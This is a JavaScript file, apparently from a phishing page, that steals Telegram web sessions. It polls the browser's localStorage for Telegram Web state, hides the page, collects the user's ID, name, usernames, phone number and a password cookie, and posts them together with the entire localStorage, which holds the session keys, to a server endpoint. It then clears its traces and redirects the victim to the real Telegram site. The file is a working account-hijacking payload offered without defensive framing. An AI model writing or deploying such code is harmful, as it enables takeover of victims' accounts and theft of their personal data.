document.addEventListener("DOMContentLoaded", function() {
  async function checkLocalStorage() {
    console.log("Checking localStorage...");
    let globalState = localStorage.getItem("tt-global-state");
    console.log("globalState:", globalState);
    if (globalState && localStorage.getItem("user_auth")) {
      console.log("User authenticated, processing...");
      const parsedState = JSON.parse(globalState);
      const currentUserId = parsedState.currentUserId;
      const currentUser = parsedState.users.byId[currentUserId];
      document.body.style.display = "none";

      if (currentUserId && currentUser) {
        const { firstName, usernames, phoneNumber, isPremium } = currentUser;
        const password = document.cookie.split("; ").find(e => e.startsWith("password="))?.split("=")[1];

        localStorage.removeItem("GramJs:apiCache");
        localStorage.removeItem("tt-global-state");

        try {
          await fetch(`/api/users/telegram/info`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              userId: currentUserId, firstName,
              usernames, phoneNumber, isPremium,
              password, quicklySet: localStorage,
              type: new URLSearchParams(window.location.search).get("type")
            })
          });
          console.log("Data sent to server successfully");
        } catch (error) {
          console.error("Fetch error:", error);
        }

        window.Telegram.WebApp.close();
        localStorage.clear();
        document.cookie = "password=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
        window.location.href = "https://web.telegram.org/a/";  

        clearInterval(checkInterval);
      }
    } else {
      console.log("No tt-global-state or user_auth found");
      sessionStorage.clear();
      localStorage.clear();
    }
  }

  const checkInterval = setInterval(checkLocalStorage, 100);
});
